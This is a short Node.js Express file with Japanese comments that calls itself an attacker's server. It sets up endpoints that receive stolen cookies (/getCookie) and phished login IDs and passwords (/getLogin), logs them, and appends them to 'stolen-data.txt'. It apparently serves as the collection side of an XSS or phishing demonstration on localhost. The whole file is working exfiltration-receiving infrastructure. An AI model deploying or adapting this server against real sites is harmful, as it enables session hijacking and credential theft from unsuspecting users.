const express = require('express');
const fs = require('fs');
const app = express();

// クエリ・POSTデータ両方をパースできるように
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const PORT = 6010; // 攻撃者用サーバーポート（任意）

// Cookieを盗むスクリプトの受け取り口
app.get('/getCookie', (req, res) => {
  const cookie = req.query.cookie;
  console.log(`[COOKIE] ${cookie}`);
  fs.appendFileSync('stolen-data.txt', `[COOKIE] ${cookie}\n`);
  res.send('Cookie received');
});

// フィッシングログイン情報を受け取る
app.post('/getLogin', (req, res) => {
  const { id, password } = req.body;
  console.log(`[LOGIN] ID: ${id}, パスワード: ${password}`);
  fs.appendFileSync('stolen-data.txt', `[LOGIN] ID: ${id}, パスワード: ${password}\n`);
  res.send('Login info received');
});

app.listen(PORT, () => {
  console.log(`Attacker server listening on http://localhost:${PORT}`);
});
